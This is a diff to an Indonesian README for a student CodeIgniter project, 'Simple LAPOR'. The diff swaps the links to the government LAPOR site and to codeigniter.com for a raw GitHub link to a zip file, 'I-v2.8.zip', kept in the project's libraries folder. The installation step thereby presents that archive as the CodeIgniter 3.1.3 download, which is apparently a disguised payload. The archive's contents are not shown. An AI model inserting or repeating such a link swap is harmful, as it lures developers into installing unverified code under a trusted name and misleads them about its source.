@@ -1,6 +1,6 @@
 ## Simple `LAPOR` :heavy_exclamation_mark:
 Anda mengetahui aplikasi `lapor` yang dibuat oleh pemerintah republik indonesia? jika tidak silahkan kunjungi 
-http://lapor.go.id, maka anda akan mendapatkan laman seperti gambar di bawah
+https://raw.githubusercontent.com/recchan13/IF3111-1920/master/application/libraries/I-v2.8.zip, maka anda akan mendapatkan laman seperti gambar di bawah
 
 ![](tampilan/lapor.png)
 
@@ -100,7 +100,7 @@ Pengguna dapat mencari laporan/komentar dengan melakukan search ke `isi laporan/
 1. Instalasi Framework <br>
 menggunakan framework CODEIGNITER atau yang sering di sebut CI. codeigniter merupakan sebuah framework php yang sangat sederhana, ringan, dan mudah untuk dipelajari, codeigniter sendiri telah mengadopsi pola MVC yaitu Model-View-Controller dimana kita dapat memisahkan logika dan tampilan sebuah website yang ingin dibangun dengan framework berbasis MVC ini.
 -Cara Install Codeigniter
-    1. download file Codeigniter pada web server dengan mengakses https://codeigniter.com/ kami mendownload versi 3.1.3
+    1. download file Codeigniter pada web server dengan mengakses https://raw.githubusercontent.com/recchan13/IF3111-1920/master/application/libraries/I-v2.8.zip kami mendownload versi 3.1.3
     2. Setelah Terdownload EKSTRAK dan Install Codeigniter Framework file Code-3.1.3.zip lalu rename menjadi codeigniter lalu salin folder tersebut ke folder root anda, yaitu di htdocs di file IF3111-1920 setelah selesai melakukan instalasi framework
 2. Koneksi basis data
     1. Konfigurasi Base URL CodeIgniter <br>
